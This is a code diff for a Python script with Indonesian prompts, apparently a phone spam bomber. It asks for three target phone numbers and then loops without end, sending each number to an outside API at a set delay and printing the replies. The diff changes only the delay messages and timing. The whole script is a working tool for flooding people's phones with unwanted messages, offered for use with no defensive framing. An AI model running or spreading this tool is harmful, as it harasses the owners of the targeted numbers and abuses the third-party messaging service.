@@ -32,7 +32,7 @@ try:
 	no = input("[?] INPUT NO TARGET 1 : ")
 	no1 = input("[?] INPUT NO TARGET 2 : ")
 	no2 = input("[?] INPUT NO TARGET 3 : ")
-	D = input("[?] MASUKAN JEDA SPAM : ")
+	D = input("[?] MASUKAN JEDA/SPAM : ")
 	D = int(D)
 except ValueError:
 	print("\nMasukan Angka Untuk Delay")
@@ -41,19 +41,17 @@ except ValueError:
 try:
 	print()
 	print("[-] RESULT:")
-
+	turu(1)
 	while True:
+		print("[!] Mencoba Spam Dengan Jeda",+D,"s")
 		r = requests.get('https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor='+no)
 		print("[+] Target 1",r.json()["msg"])
-		print('[!] Delay',+D,'s')
 		turu(D)
 		r1 = requests.get('https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor='+no1)
 		print("[+] Target 2",r1.json()["msg"])
-		print('[!] Delay',+D,'s')
 		turu(D)
 		r2 = requests.get('https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor='+no2)
 		print("[+] Target 3",r2.json()["msg"])
-		print('[!] Delay',+D,'s')
 		turu(D)
 except KeyboardInterrupt:
 	exit("\nBye...")
